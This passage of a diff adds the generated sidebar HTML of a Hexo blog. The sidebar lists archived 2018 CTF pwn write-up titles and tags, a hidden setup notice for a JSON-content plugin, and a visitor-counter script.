+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/0ctf2018/" >0ctf 2018 PWN 部分题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href= "/2018/03/27/QWB2018/" >QWBCTF 2018 PWN 部分题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/2018/03/20/tcache/" >tcache 源码分析及利用思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/n1ctf2018/" >N1CTF 2018 && 线程堆知识源代码分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/2018/03/06/hgame/" >HGAME 2018 PWN题记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/03</span><a class="archive-post-title" href= "/2018/03/03/question/" >问题解决及工具使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/05</span><a class="archive-post-title" href= "/2018/02/05/hitctf/" >HITCTF 2018 PWN 题记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span><a class="archive-post-title" href= "/2018/01/23/hello-world/" >Hello World</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name"><a href= "#">PWN</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">CTF</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">hello</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">world</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">KERNEL</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">Questions</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">Linux</a></span>
+    
+    </div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: false
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tag-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var jsInfo = {
+        root: '/'
+    }
+</script>
+    <!-- 不蒜子  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ统计  -->
+    
+    </div>
+    </body>
+</html>
+
+
